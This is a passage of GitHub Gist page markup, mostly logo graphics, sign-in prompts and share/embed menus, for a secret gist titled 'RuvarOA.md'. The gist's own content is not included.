0-.255.253v6.08H33.14v-6.08a.262.262 0 0 0-.255-.253h-3.196a.262.262 0 0 0-.255.253v16.514c0 .133.135.252.255.252h3.196a.262.262 0 0 0 .255-.253v-7.06h4.966l-.03 7.06c0 .134.12.253.255.253h3.195a.262.262 0 0 0 .255-.253V3.892a.262.262 0 0 0-.255-.253Zm-28.31 7.313v8.532c0 .06-.015.163-.09.193 0 0-1.875 1.323-4.966 1.323C4.426 21 0 19.84 0 12.2S3.87 2.986 7.651 3c3.27 0 4.59.728 4.8.862.06.075.09.134.09.208l-.63 2.646c0 .134-.134.297-.3.253-.54-.164-1.35-.49-3.255-.49-2.205 0-4.575.623-4.575 5.543s2.25 5.5 3.87 5.5c1.38 0 1.875-.164 1.875-.164V13.94H7.321c-.165 0-.285-.12-.285-.253v-2.735c0-.134.12-.252.285-.252h5.61c.166 0 .286.118.286.252Z"></path>
</svg>
  <svg aria-hidden="true" height="24" viewBox="0 0 38 24" version="1.1" width="38" data-view-component="true" class="octicon octicon-logo-gist v-align-middle d-none d-md-inline-block">
    <path d="M7.05 13.095v-1.5h5.28v8.535c-1.17.555-2.925.96-5.385.96C1.665 21.09 0 17.055 0 12.045S1.695 3 6.945 3c2.43 0 3.96.495 4.92.99v1.575c-1.83-.75-3-1.095-4.92-1.095-3.855 0-5.22 3.315-5.22 7.59s1.365 7.575 5.205 7.575c1.335 0 2.97-.105 3.795-.51v-6.03H7.05Zm16.47 1.035h.045c3.33.3 4.125 1.425 4.125 3.345 0 1.815-1.14 3.615-4.71 3.615-1.125 0-2.745-.285-3.495-.585v-1.41c.705.255 1.83.54 3.495.54 2.43 0 3.09-1.035 3.09-2.13 0-1.065-.33-1.815-2.655-2.01-3.39-.3-4.095-1.5-4.095-3.12 0-1.665 1.08-3.465 4.38-3.465 1.095 0 2.34.135 3.375.585v1.41c-.915-.3-1.83-.54-3.405-.54-2.325 0-2.82.855-2.82 2.01 0 1.035.42 1.56 2.67 1.755Zm12.87-4.995v1.275h-3.63v7.305c0 1.425.795 2.01 2.25 2.01.3 0 .63 0 .915-.045v1.335c-.255.045-.75.075-1.035.075-1.965 0-3.75-.9-3.75-3.195v-7.5H28.8v-.72l2.34-.66V5.85l1.62-.465v3.75h3.63ZM16.635 9.09v9.615c0 .81.285 1.05 1.005 1.05v1.335c-1.71 0-2.58-.705-2.58-2.58V9.09h1.575Zm.375-3.495c0 .66-.51 1.17-1.17 1.17a1.14 1.14 0 0 1-1.155-1.17c0-.66.48-1.17 1.155-1.17s1.17.51 1.17 1.17Z"></path>
</svg>
</a>
  </div>

    <div class="Header-item f4 mr-0" role="navigation" aria-label="Sign in or sign up">
      <a class="Header-link no-underline mr-3" data-ga-click="Header, sign in" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist header&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="1a43b88b028fb4af292c7162ac2a1e44dc0d09a8634b7d846f2dded0fd2b6b62" href="https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FMr-xn%2Fbc8261a5c3e35a72768723acf1da358d">
        Sign&nbsp;in
</a>        <a class="Header-link d-inline-block no-underline border color-border-default rounded px-2 py-1" data-ga-click="Header, sign up" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist header&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="bda0b041563258ea9a294af5fb86c50bf84ed621446e2e8e357a6c4dd0f1631f" href="/join?return_to=https%3A%2F%2Fgist.github.com%2FMr-xn%2Fbc8261a5c3e35a72768723acf1da358d&amp;source=header-gist">
          Sign&nbsp;up
</a>    </div>
</div>



      <div hidden="hidden" data-view-component="true" class="js-stale-session-flash stale-session-flash flash flash-warn flash-full">
  
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
        <span class="js-stale-session-flash-signed-in" hidden>You signed in with another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>
        <span class="js-stale-session-flash-signed-out" hidden>You signed out in another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>
        <span class="js-stale-session-flash-switched" hidden>You switched accounts on another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>

    <button id="icon-button-d254f93f-692f-4446-8617-feda7226ccd6" aria-labelledby="tooltip-fac3e30c-4ffe-47c9-8cef-5d7b6da61ed8" type="button" data-view-component="true" class="Button Button--iconOnly Button--invisible Button--medium flash-close js-flash-close">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x Button-visual">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
</button><tool-tip id="tooltip-fac3e30c-4ffe-47c9-8cef-5d7b6da61ed8" for="icon-button-d254f93f-692f-4446-8617-feda7226ccd6" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Dismiss alert</tool-tip>


  
</div>
    </div>

  <div id="start-of-content" class="show-on-focus"></div>








    <div id="js-flash-container" class="flash-container" data-turbo-replace>




  <template class="js-flash-template">
    
<div class="flash flash-full   {{ className }}">
  <div >
    <button autofocus class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
    </button>
    <div aria-atomic="true" role="alert" class="js-flash-alert">
      
      <div>{{ message }}</div>

    </div>
  </div>
</div>
  </template>
</div>


    






  <div
    class="application-main "
    data-commit-hovercards-enabled
    data-discussion-hovercards-enabled
    data-issue-and-pr-hovercards-enabled
    data-project-hovercards-enabled
  >
        <div itemscope itemtype="http://schema.org/Code">
    <main id="gist-pjax-container">
      

  <div class="gist-detail-intro gist-banner pb-3">
    <div class="text-center container-lg px-3">
      <p class="lead">
        Instantly share code, notes, and snippets.
      </p>
    </div>
  </div>


<div class="gisthead pagehead pb-0 pt-3 mb-4">
  <div class="px-0">
    
  
<div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
  <div class="flex-auto min-width-0 width-fit mr-3">
    <div class="d-flex">
      <div class="d-none d-md-block">
        <a class="mr-2 flex-shrink-0" data-hovercard-type="user" data-hovercard-url="/users/Mr-xn/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/Mr-xn"><img class="avatar avatar-user" src="https://avatars.githubusercontent.com/u/18260135?s=64&amp;v=4" width="32" height="32" alt="@Mr-xn" /></a>
      </div>
      <div class="d-flex flex-column width-full">
        <div class="d-flex flex-row width-full">
          <h1 class="wb-break-word f3 text-normal mb-md-0 mb-1">
            <span class="author"><a data-hovercard-type="user" data-hovercard-url="/users/Mr-xn/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/Mr-xn">Mr-xn</a></span><!--
                --><span class="mx-1 color-fg-muted">/</span><!--
                --><strong itemprop="name" class="css-truncate-target mr-1" style="max-width: 410px"><a href="/Mr-xn/bc8261a5c3e35a72768723acf1da358d">RuvarOA.md</a></strong>
              <span title="Only those with the link can see this gist." data-view-component="true" class="Label v-align-middle">
                Secret
</span>          </h1>
        </div>

        <div class="note m-0">
          Created
          <relative-time tense="past" datetime="2024-02-06T10:55:08Z" data-view-component="true">February 6, 2024 10:55</relative-time>
        </div>
      </div>
    </div>
  </div>
  <ul class="d-md-flex pagehead-actions float-none mr-2">
  </ul>
  <div class="d-inline-block d-md-none ml-auto">
    <action-menu data-select-variant="none" data-view-component="true" class="flex-self-start ml-auto d-inline-block">
  <focus-group direction="vertical" mnemonics retain>
    <button id="gist_options-button" popovertarget="gist_options-overlay" aria-controls="gist_options-list" aria-haspopup="true" aria-labelledby="tooltip-65a3fb2a-e1b2-420e-b5cb-215949b0900a" type="button" data-view-component="true" class="Button Button--iconOnly Button--secondary Button--small">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal Button-visual">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg>
</button><tool-tip id="tooltip-65a3fb2a-e1b2-420e-b5cb-215949b0900a" for="gist_options-button" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Show Gist options</tool-tip>


<anchored-position data-target="action-menu.overlay" id="gist_options-overlay" anchor="gist_options-button" align="start" side="outside-bottom" anchor-offset="normal" popover="auto" data-view-component="true">
  <div data-view-component="true" class="Overlay Overlay--size-auto">
    
      <div data-view-component="true" class="Overlay-body Overlay-body--paddingNone">          <action-list>
  <div data-view-component="true">
    <ul aria-labelledby="gist_options-button" id="gist_options-list" role="menu" data-view-component="true" class="ActionListWrap--inset ActionListWrap">
        <li rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;DOWNLOAD_ZIP&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:128145818,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="c860a5e66e6cff4aac7429af6afe9a992f7e0e109fcd9335f55df7d47de9bd99" data-ga-click="Gist, download zip, location:gist overview" data-targets="action-list.items" data-item-id="download_from_gist_options" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-f16d2532-0a17-48cc-809e-e30e9a250d9c" href="/Mr-xn/bc8261a5c3e35a72768723acf1da358d/archive/860fbf68a1fdf4e26aca4ac598f4996e0a180caf.zip" role="menuitem" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-download">
    <path d="M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 13.25 14Z"></path><path d="M7.25 7.689V2a.75.75 0 0 1 1.5 0v5.689l1.97-1.969a.749.749 0 1 1 1.06 1.06l-3.25 3.25a.749.749 0 0 1-1.06 0L4.22 6.78a.749.749 0 1 1 1.06-1.06l1.97 1.969Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
          Download ZIP
</span>      
</a>
  
</li>
</ul>    
</div></action-list>


</div>
      
</div></anchored-position>  </focus-group>
</action-menu>  </div>
  <ul class="d-md-flex d-none pagehead-actions float-none">


      <li>
          <a id="gist-star-button" href="/login?return_to=https%3A%2F%2Fgist.github.com%2FMr-xn%2Fbc8261a5c3e35a72768723acf1da358d" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist star button&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="17a67bce76f8678f1aaeb32d03109d35fadeca3e13414e7232ef955c3ad3d064" aria-label="You must be signed in to star a gist" data-view-component="true" class="btn-with-count Button--secondary Button--small Button">  <span class="Button-content">
      <span class="Button-visual Button-leadingVisual">
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-star">
    <path d="M8 .25a.75.75 0 0 1 .673.418l1.882 3.815 4.21.612a.75.75 0 0 1 .416 1.279l-3.046 2.97.719 4.192a.751.751 0 0 1-1.088.791L8 12.347l-3.766 1.98a.75.75 0 0 1-1.088-.79l.72-4.194L.818 6.374a.75.75 0 0 1 .416-1.28l4.21-.611L7.327.668A.75.75 0 0 1 8 .25Zm0 2.445L6.615 5.5a.75.75 0 0 1-.564.41l-3.097.45 2.24 2.184a.75.75 0 0 1 .216.664l-.528 3.084 2.769-1.456a.75.75 0 0 1 .698 0l2.77 1.456-.53-3.084a.75.75 0 0 1 .216-.664l2.24-2.183-3.096-.45a.75.75 0 0 1-.564-.41L8 2.694Z"></path>
</svg>
      </span>
    <span class="Button-label">Star</span>
      <span class="Button-visual Button-trailingVisual">
          <span class="sr-only">(<span aria-hidden="true" title="0" data-view-component="true" class="Counter">0</span>)</span>
          <span aria-hidden="true" title="0" data-view-component="true" class="Counter">0</span>
      </span>
  </span>
</a><tool-tip id="tooltip-13042773-16c9-45fb-b917-5eace33c8b21" for="gist-star-button" popover="manual" data-direction="n" data-type="description" data-view-component="true" class="sr-only position-absolute">You must be signed in to star a gist</tool-tip>

      </li>
        <li>
            <a id="gist-fork-button" href="/login?return_to=https%3A%2F%2Fgist.github.com%2FMr-xn%2Fbc8261a5c3e35a72768723acf1da358d" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist fork button&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="236ac02818b5c75430eb16b40a037fab7656d2f99765a002f1f6e12da282ffcf" aria-label="You must be signed in to fork a gist" data-view-component="true" class="btn-with-count Button--secondary Button--small Button">  <span class="Button-content">
      <span class="Button-visual Button-leadingVisual">
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo-forked">
    <path d="M5 5.372v.878c0 .414.336.75.75.75h4.5a.75.75 0 0 0 .75-.75v-.878a2.25 2.25 0 1 1 1.5 0v.878a2.25 2.25 0 0 1-2.25 2.25h-1.5v2.128a2.251 2.251 0 1 1-1.5 0V8.5h-1.5A2.25 2.25 0 0 1 3.5 6.25v-.878a2.25 2.25 0 1 1 1.5 0ZM5 3.25a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Zm6.75.75a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5Zm-3 8.75a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Z"></path>
</svg>
      </span>
    <span class="Button-label">Fork</span>
      <span class="Button-visual Button-trailingVisual">
          <span class="sr-only">(<span aria-hidden="true" title="0" data-view-component="true" class="Counter">0</span>)</span>
          <span aria-hidden="true" title="0" data-view-component="true" class="Counter">0</span>
      </span>
  </span>
</a><tool-tip id="tooltip-1c239d30-0816-4898-8a3e-8c9df7ca07ff" for="gist-fork-button" popover="manual" data-direction="n" data-type="description" data-view-component="true" class="sr-only position-absolute">You must be signed in to fork a gist</tool-tip>

        </li>
  </ul>
</div>

  <ul class="d-flex d-md-none px-3 mb-2 pagehead-actions float-none" >
    <li>
      
<div data-view-component="true" class="flex-items-center d-inline-flex">
  <action-menu data-menu-input="gist-share-url-sized-down" data-select-variant="single" data-dynamic-label="" data-view-component="true" class="flex-shrink-0">
  <focus-group direction="vertical" mnemonics retain>
    <button id="action-menu-8250468e-cdd9-4288-a1f1-1a2e83720308-button" popovertarget="action-menu-8250468e-cdd9-4288-a1f1-1a2e83720308-overlay" aria-controls="action-menu-8250468e-cdd9-4288-a1f1-1a2e83720308-list" aria-haspopup="true" type="button" data-view-component="true" class="rounded-right-0 border-right-0 Button--secondary Button--small Button">  <span class="Button-content">
    <span class="Button-label">Embed</span>
  </span>
    <span class="Button-visual Button-trailingAction">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down">
    <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
</svg>
    </span>
</button>


<anchored-position data-target="action-menu.overlay" id="action-menu-8250468e-cdd9-4288-a1f1-1a2e83720308-overlay" anchor="action-menu-8250468e-cdd9-4288-a1f1-1a2e83720308-button" align="start" side="outside-bottom" anchor-offset="normal" popover="auto" data-view-component="true">
  <div data-view-component="true" class="Overlay Overlay--size-auto">
    
      <div data-view-component="true" class="Overlay-body Overlay-body--paddingNone">          <action-list>
  <div data-view-component="true">
    <ul aria-labelledby="action-menu-8250468e-cdd9-4288-a1f1-1a2e83720308-button" id="action-menu-8250468e-cdd9-4288-a1f1-1a2e83720308-list" role="menu" data-view-component="true" class="ActionListWrap--inset ActionListWrap">
        <li data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <button value="&lt;script src=&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d.js&quot;&gt;&lt;/script&gt;" tabindex="-1" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;EMBED&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:128145818,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="1639717bb1bfc852314837a07b5082eeb9141eff8d55206d791cd6cdd0973536" id="item-f951c7a7-c471-4339-883c-2e6533aab973" type="button" role="menuitemradio" aria-checked="true" data-view-component="true" class="ActionListContent">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
      <span data-view-component="true" class="ActionListItem-descriptionWrap">
        <span data-view-component="true" class="ActionListItem-label">
           Embed
</span>      <span data-view-component="true" class="ActionListItem-description">Embed this gist in your website.</span>
</span></button>
  
</li>
        <li data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <button value="https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d" tabindex="-1" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;SHARE&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:128145818,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="213a082e4e385c5f692afe18a83edcd9fe46fd0f109bd04a559867a0896f48e0" id="item-46e5ad5b-1517-4c1b-b1de-305d6bac6ae2" type="button" role="menuitemradio" aria-checked="false" data-view-component="true" class="ActionListContent">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
      <span data-view-component="true" class="ActionListItem-descriptionWrap">
        <span data-view-component="true" class="ActionListItem-label">
           Share
</span>      <span data-view-component="true" class="ActionListItem-description">Copy sharable link for this gist.</span>
</span></button>
  
</li>
        <li data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <button value="https://gist.github.com/bc8261a5c3e35a72768723acf1da358d.git" tabindex="-1" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;USE_HTTPS&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:128145818,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="abb858226e767e1659ca31b793fc15aa85dd571c45e30542ecb7a26d6ed4c745" id="item-bd782ec1-2f05-4bda-91f9-1e935e353112" type="button" role="menuitemradio" aria-checked="false" data-view-component="true" class="ActionListContent">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
      <span data-view-component="true" class="ActionListItem-descriptionWrap">
        <span data-view-component="true" class="ActionListItem-label">
          Clone via HTTPS
</span>      <span data-view-component="true" class="ActionListItem-description">Clone using the web URL.</span>
</span></button>
  
</li>
        <li role="presentation" aria-hidden="true" data-view-component="true" class="ActionList-sectionDivider"></li>
        <li target="_blank" rel="noopener noreferrer" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-50270cc7-ad1f-4dd3-84a1-bc739b4104d1" href="https://docs.github.com/articles/which-remote-url-should-i-use" role="menuitemradio" aria-checked="false" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-question">
    <path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.92 6.085h.001a.749.749 0 1 1-1.342-.67c.169-.339.436-.701.849-.977C6.845 4.16 7.369 4 8 4a2.756 2.756 0 0 1 1.637.525c.503.377.863.965.863 1.725 0 .448-.115.83-.329 1.15-.205.307-.47.513-.692.662-.109.072-.22.138-.313.195l-.006.004a6.24 6.24 0 0 0-.26.16.952.952 0 0 0-.276.245.75.75 0 0 1-1.248-.832c.184-.264.42-.489.692-.661.103-.067.207-.132.313-.195l.007-.004c.1-.061.182-.11.258-.161a.969.969 0 0 0 .277-.245C8.96 6.514 9 6.427 9 6.25a.612.612 0 0 0-.262-.525A1.27 1.27 0 0 0 8 5.5c-.369 0-.595.09-.74.187a1.01 1.01 0 0 0-.34.398ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
                Learn more about clone URLs

</span>      
</a>
  
</li>
</ul>    
</div></action-list>


</div>
      
</div></anchored-position>  </focus-group>
</action-menu>    <primer-text-field class="FormControl width-full FormControl--fullWidth">
      <label for="gist-share-url-sized-down" class="sr-only FormControl-label">
        Clone this repository at &amp;lt;script src=&amp;quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
</label>    
  <div class="FormControl-input-wrap FormControl-input-wrap--small">
    
      <input id="gist-share-url-sized-down" aria-label="Clone this repository at &amp;lt;script src=&amp;quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;" value="&lt;script src=&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d.js&quot;&gt;&lt;/script&gt;" readonly="readonly" data-autoselect="true" data-target="primer-text-field.inputElement " aria-describedby="validation-631e4f8c-bd95-4c73-9b22-bed5b365a3aa" class="form-control FormControl-monospace FormControl-input FormControl-small rounded-left-0 rounded-right-0 border-right-0" type="text" name="gist-share-url-sized-down" />
</div>
      <div class="FormControl-inlineValidation" id="validation-631e4f8c-bd95-4c73-9b22-bed5b365a3aa" hidden="hidden">
  <span class="FormControl-inlineValidation--visual" data-target="primer-text-field.validationSuccessIcon" hidden><svg aria-hidden="true" height="12" viewBox="0 0 12 12" version="1.1" width="12" data-view-component="true" class="octicon octicon-check-circle-fill">
    <path d="M6 0a6 6 0 1 1 0 12A6 6 0 0 1 6 0Zm-.705 8.737L9.63 4.403 8.392 3.166 5.295 6.263l-1.7-1.702L2.356 5.8l2.938 2.938Z"></path>
</svg></span>
  <span class=" FormControl-inlineValidation--visual" data-target="primer-text-field.validationErrorIcon"><svg aria-hidden="true" height="12" viewBox="0 0 12 12" version="1.1" width="12" data-view-component="true" class="octicon octicon-alert-fill">
    <path d="M4.855.708c.5-.896 1.79-.896 2.29 0l4.675 8.351a1.312 1.312 0 0 1-1.146 1.954H1.33A1.313 1.313 0 0 1 .183 9.058ZM7 7V3H5v4Zm-1 3a1 1 0 1 0 0-2 1 1 0 0 0 0 2Z"></path>
</svg></span>
  <span></span>
</div>
    
</primer-text-field>
  <span data-view-component="true">
  <clipboard-copy id="clipboard-button" aria-label="Copy" for="gist-share-url-sized-down" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;COPY_URL&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:128145818,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="a2023b04695ea1f64f299d229335f4e15b11a61e1116a39e5b6832c0d428b745" type="button" data-view-component="true" class="rounded-left-0 Button--secondary Button--small Button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg style="display: none;" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check color-fg-success">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
